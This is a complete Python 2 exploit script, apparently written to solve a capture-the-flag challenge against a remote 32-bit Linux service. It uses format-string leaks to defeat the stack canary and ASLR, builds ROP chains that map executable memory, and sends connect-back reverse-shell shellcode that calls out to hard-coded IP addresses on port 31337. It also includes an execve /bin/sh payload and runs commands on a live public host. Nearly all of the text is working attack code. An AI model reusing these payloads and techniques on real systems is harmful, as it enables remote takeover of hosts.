__author__ = 'HuyNA'
#! /usr/local/bin/python
import socket
from struct import *
import time
import telnetlib
import sys
"""
     dung lenh socat de tao moi truong remote
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./task
"""
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

def build_rop_2(base_address, stack_address):
    global puts_address
    leave_ret = 0x00000C0A + base_address
    pop_ebp_ret = 0x000008B9 + base_address
    pop_pop_ebp_ret = 0x000008B8 + base_address
    str_addr = 0x00000CC6 + base_address	# str = 'mmap'	

    rop = ''
    rop += pack('<I', puts_address)	# test puts('mmap')
    rop += pack('<I', pop_ebp_ret)
    #rop += pack('<I', pop_pop_ebp_ret)
    rop += pack('<I', str_addr)
    rop += pack('<I', pop_ebp_ret)
    rop += pack('<I', stack_address+0x10)
    rop += pack('<I', leave_ret)
    return rop

def build_rop(base_address, stack_address):

    global read_address, mmap_address

    pop7_addr = 0x0000095F + base_address # add esp, 14h; pop ebx, pop ebp, ret
    MAPADDR, size = 0x11111000, 0x1000
    strncpy_addr = 0x00000810 + base_address
    rop = ''
    rop += pack('<I', mmap_address)
    rop += pack('<I', pop7_addr)
    rop += pack('<I', MAPADDR)
    rop += pack('<I', size)
    rop += pack('<I', 0x7)
    rop += pack('<I', 0x22)
    rop += pack('<I', 0xffffffff)
    rop += pack('<I', 0)
    rop += 'AAAA'
    rop += pack('<I', read_address)
    rop += pack('<I', MAPADDR)
    rop += pack('<I', 0)
    rop += pack('<I', MAPADDR)
    rop += pack('<I', 0x100)
    return rop

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "109.233.61.11"
local_host="192.168.248.155"
port = 3129            # Reserve a port for your service.
#s.connect((local_host, port))
s.connect((host, port))
sys.stdin.read(1)
# 0xb7769da0 stdout

print(s.recv(len("pw?\n")))   # pw?
s.send("letmein\n")


# First get stack cookie value
time.sleep(0.1)
print(s.recv(len('msg?\n')))  # msg?
mess = '%78$08x' + '%79$08x' + '%10$08x' + '%82$08x' 
msg1 = mess + (128-len(mess)) * 'a'
s.send(msg1)
data = recv_until(s,'\n')
print data
stack_address = int(data[16:24], 16) - 0x1A8
print('stack address = '+hex(stack_address))
base_address = int(data[8:16], 16) & 0xFFFFF000
print('base address = '+hex(base_address))
canary = data[0:8]
print 'stack canary = ', canary
canary = pack('<I', int(canary, 16))
print 'stack canary = ', canary
canary = 'a' + canary[1:4]
print(canary.encode('hex'))


print('[+] ... get got table') 
def get_function_addr(address_str):
	time.sleep(0.1)
	print(s.recv(len('msg?\n')))  # msg?
	mess = address_str + '%08x'*13 + '%s'
	msg1 = mess + (128-len(mess))* 'a'
	s.send(msg1)
	data = recv_until(s,'\n')
	#print data.encode('hex')
	address = unpack('<I', data[108:112])
	address = address[0]
	print('address = {}'.format(hex(address)))
	return address

temp = pack('<I', base_address + 0x00001FA4)
read_address = get_function_addr(temp)
temp = pack('<I', base_address + 0x00001FC0)
puts_address = get_function_addr(temp)
temp = pack('<I', base_address + 0x00001FCC)
mmap_address = get_function_addr(temp)


print('[+] ... fix stack cookies')
time.sleep(0.1)
rop = build_rop_2(base_address, stack_address)
print(recv_until(s, '\n'))
print(rop.encode('hex'))
mess = '%016x'*16  + canary + 'a'*12 + rop
msg1 = mess + 'a'*(128-len(mess)) 
#mess = '%08x'*28 + canary
#msg1 = mess + 'a'*(128-len(mess))
s.send(msg1)
print(recv_until(s, '\n').encode('hex'))
print(recv_until(s, '\n').encode('hex')) # co ki tu '\x0a'

print('[+] ... fill last 0')
time.sleep(0.1)
print(recv_until(s, '\n'))  # msg?
mess = '%08x'*32
msg1 = mess 
print("mess = "+msg1)
s.send(msg1)
print(recv_until(s, '\n').encode('hex'))

def test():
	print('[+] ... test')
	time.sleep(0.1)
	print(recv_until(s, '\n'))  # msg?
	mess = '%78$08x' + '%79$08x' + '%80$08x' + '%81$08x' + '%82$08x' + '%83$08x' + '%84$08x' + '%85$08x' + '%86$08x' + '%87$08x'
	msg1 = mess + (128-len(mess)) * 'b'
	s.send(msg1)
	time.sleep(0.1)
	data = recv_until(s, '\n')
	print data
#test()


def test_mem(address):
	print('[+] ... test mem')
	time.sleep(0.1)
	print(s.recv(len('msg?\n')))  # msg?
	address_str = pack('<I', address)
	mess = address_str + '%08x'*13 + '%s'
	msg1 = mess + (128-len(mess))* 'a'
	s.send(msg1)
	data = recv_until(s,'\n')
	print data.encode('hex')

#test_mem(0x000008b9 + base_address)

print('[+] ... BREAK LOOP')
time.sleep(0.1)
print(s.recv(len('msg?\n')))  # msg?
rop2 = build_rop(base_address, stack_address)
temp = 0x00000C6C + base_address
pop4_ret = pack('<I', temp)
mess = pop4_ret + 'n'*16 + rop2 
msg1 = mess + 'c'*(128-len(mess))
s.send(msg1)

#print(recv_until(s, '\n'))  # i hate this symbol!
time.sleep(2)
#print(s.recv(1000))

# ... and send shellcode
# ip = 192.168.248.155 '\xc0\xa8\xf8\x9B' 
# port = 31337	\x7a\x69
connect_back_shell = 	"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68'+'\x9B\xf8\xa8\xc0'+'\x66\x68'+'\x7a\x69'+'\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"

shell_localhost_ip ='\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xc0\xa8\xf8\x9b\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80'
shell_public_ip =   '\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xd2\xd3\x7c\x83\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80'
time.sleep(1)

# Linux/x86 - setreud(getuid(), getuid()) & execve(/bin/sh) - 34 bytes by Magnefikko
shell = '\x90' * 10 + '\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80'
time.sleep(1)
print("[+] Send shellcode")
s.send(shell_public_ip)

print '[+] ... Send shellcode done. Press Enter to continue'
#sys.stdin.read(1)
print 'a'
s.send('ls -l\n')
time.sleep(2)
print(s.recv(1000))
print 'b'


'''
f = open('input', 'w')
f.write(all_msg)
f.close()

b75cef70
b77588b9
b7758cc6
b77588b9
bfe8721c
b7758c0
70ef5cb7
b98875b7
c68c75b7
b98875b7
1c72e8bf
0a8c75b7

'''

"""
    b *0x00000A89
"""